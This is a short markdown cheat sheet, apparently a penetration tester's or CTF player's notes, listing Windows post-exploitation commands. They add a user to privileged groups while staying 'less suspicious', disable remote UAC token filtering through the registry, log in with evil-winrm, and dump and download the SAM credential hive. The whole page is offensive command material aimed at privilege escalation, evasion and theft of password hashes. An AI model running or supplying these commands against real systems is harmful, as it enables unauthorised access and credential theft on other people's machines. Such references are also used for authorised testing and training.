# 🌆  Windows / Commands

This documents is for windows

---

## 🧚‍♀️ Admin perm via group

- Add administrator group for a user\
`net localgroup administrators <USER> /add`

- Add B.O to get SAM content and be less supicious\
`net localgroup "Backup Operators" <USER> /add`

- Add user to allow RDP\
`net localgroup "Remote Management Users" <USER> /add`

---

## 🛸 UAC

- Desactivate the option in reg to use admin with rdp\
`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`

---

## 🦉 Evil WinRm

- Connect to a windows machine\
`evil-winrm -i <IP> -u <USER> -p <PASSWORD>`

- Download the sam file\
`reg save hklm\sam sam.bak` \
`download sam.bak`


---
